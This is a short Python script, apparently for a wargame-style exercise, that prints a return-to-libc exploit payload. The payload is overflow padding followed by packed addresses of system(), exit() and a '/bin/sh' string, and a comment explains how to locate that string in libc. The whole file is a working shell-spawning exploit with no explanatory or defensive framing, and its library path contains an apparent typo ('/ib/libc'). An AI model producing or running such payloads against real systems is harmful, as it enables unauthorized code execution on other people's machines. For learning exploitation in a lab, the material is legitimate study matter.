#!/usr/bin/env python
import struct

padding = "AAAA"*(0x55-0x41)
system = struct.pack("<I", 0xb7ecffb0)
exit = struct.pack("<I", 0xb7ec60c0)
"""
use strings -a -t x /ib/libc-2.11.2.so | grep "/bin/sh" to find
bin_sh address
"""

bin_sh = struct.pack("<I", 0xb7e97000+0x011f3bf)

print padding + system + exit + bin_sh
